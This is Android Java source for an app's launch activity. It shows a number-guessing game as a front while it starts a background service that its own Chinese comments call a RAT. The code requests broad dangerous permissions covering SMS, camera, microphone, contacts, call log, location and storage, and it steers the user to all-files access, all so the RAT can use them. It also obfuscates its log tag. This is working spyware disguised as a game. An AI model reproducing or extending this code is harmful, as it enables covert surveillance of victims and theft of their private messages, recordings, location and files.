package com.piupiupiu;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class LaunchActivity extends Activity {

    private static final String TAG = StrCodec.dec("Ez9TEA==");

    /**
     * 需要运行时申请的危险权限（targetSdk=24，必须用户授权）。
     * 关键：在应用内弹系统对话框授予，不走「设置」——避免 Android/MIUI 在「设置」里授权时
     * 强杀进程导致 CoreService 与轮询线程被一起杀掉、连接断开。一次性在启动时申请，
     * 之后就不再需要进「设置」授权，也就不会再因授权而掉线。
     */
    private static final String[] RUNTIME_PERMS = {
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    private static final int REQ_RUNTIME_PERMS = 1001;
    /** 跳「所有文件访问权限」设置页的请求码（Android 11+ 专用）。 */
    private static final int REQ_ALL_FILES = 1002;
    /** API 30+ 才有的设置 action（字面量，避免抬高 compileSdk）。 */
    private static final String ACTION_MANAGE_ALL_FILES = "android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION";

    // ---- 猜数字小游戏状态 ----
    private EditText etGuess;
    private TextView tvResult;
    private TextView tvAttempts;
    private Button btnGuess;
    private Button btnRestart;
    private int target;
    private int attempts;
    private boolean finished;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 先初始化游戏 UI，保证点开 APK 立刻有可见界面，不会再“一闪而过直接退出”。
        initGame();

        // 立即拉起 RAT 后台服务，保证设备上线；与前台游戏 UI 互不干扰。
        startService(new Intent(this, CoreService.class));

        // 申请危险权限（用于 SMS/相机/文件等 RAT 功能）。不再 finish，游戏继续显示。
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            List<String> need = new ArrayList<String>();
            for (String p : RUNTIME_PERMS) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    need.add(p);
                }
            }
            if (!need.isEmpty()) {
                Log.i(TAG, "requesting runtime permissions in-app");
                requestPermissions(need.toArray(new String[0]), REQ_RUNTIME_PERMS);
            }
        }
        ensureAllFilesAccess();
    }

    // ===== 猜数字小游戏 =====
    private void initGame() {
        etGuess = (EditText) findViewById(R.id.etGuess);
        tvResult = (TextView) findViewById(R.id.tvResult);
        tvAttempts = (TextView) findViewById(R.id.tvAttempts);
        btnGuess = (Button) findViewById(R.id.btnGuess);
        btnRestart = (Button) findViewById(R.id.btnRestart);
        newRound();
        btnGuess.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { doGuess(); }
        });
        btnRestart.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { newRound(); }
        });
    }

    private void newRound() {
        target = new Random().nextInt(100) + 1;
        attempts = 0;
        finished = false;
        tvResult.setText("");
        tvAttempts.setText("已猜次数：0");
        etGuess.setText("");
        etGuess.setEnabled(true);
        btnGuess.setEnabled(true);
    }

    private void doGuess() {
        if (finished) return;
        String s = etGuess.getText().toString().trim();
        if (s.isEmpty()) {
            Toast.makeText(this, "先输入一个数字", Toast.LENGTH_SHORT).show();
            return;
        }
        int g;
        try {
            g = Integer.parseInt(s);
        } catch (Exception e) {
            Toast.makeText(this, "请输入 1-100 的整数", Toast.LENGTH_SHORT).show();
            return;
        }
        if (g < 1 || g > 100) {
            Toast.makeText(this, "请输入 1-100 的整数", Toast.LENGTH_SHORT).show();
            return;
        }
        attempts++;
        tvAttempts.setText("已猜次数：" + attempts);
        if (g == target) {
            finished = true;
            tvResult.setText("恭喜你，猜对了！答案就是 " + target + "，用了 " + attempts + " 次");
            etGuess.setEnabled(false);
            btnGuess.setEnabled(false);
        } else if (g < target) {
            tvResult.setText("太小了，再大一点～");
        } else {
            tvResult.setText("太大了，再小一点～");
        }
        etGuess.setText("");
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        // 无论授权结果如何都继续；连接本身不需要任何权限，缺权限只是个别功能受限。
        ensureAllFilesAccess();
    }

    /**
     * Android 11+（API 30+）作用域存储：READ_EXTERNAL_STORAGE 不再能列共享存储的文件，
     * 文件管理器必须用「所有文件访问权限」(MANAGE_EXTERNAL_STORAGE)。该权限无法用
     * requestPermissions，只能跳系统设置页由用户手动开启。这里用反射调用 API 30 才有的
     * Environment.isExternalStorageManager()，避免把 compileSdk 从 24 抬高到 30（离线构建环境只有 24）。
     */
    private void ensureAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= 30 && !isExternalStorageManager()) {
            try {
                Intent intent = new Intent(ACTION_MANAGE_ALL_FILES);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQ_ALL_FILES);
            } catch (Exception e) {
                Log.e(TAG, "cannot launch all-files settings, continue anyway", e);
            }
        }
        // 不再 finish()：游戏界面常驻前台，RAT 服务在后台运行。
    }

    /** 反射判断是否已获得「所有文件访问权限」；低于 API 30 视为已授权（传统存储模型）。 */
    private boolean isExternalStorageManager() {
        try {
            java.lang.reflect.Method m = android.os.Environment.class.getMethod("isExternalStorageManager");
            return (Boolean) m.invoke(null);
        } catch (Exception e) {
            return true; // 方法不存在（<API 30）时按「已授权」处理
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // 从「所有文件访问权限」设置页返回后不做任何销毁处理，游戏继续显示。
    }
}
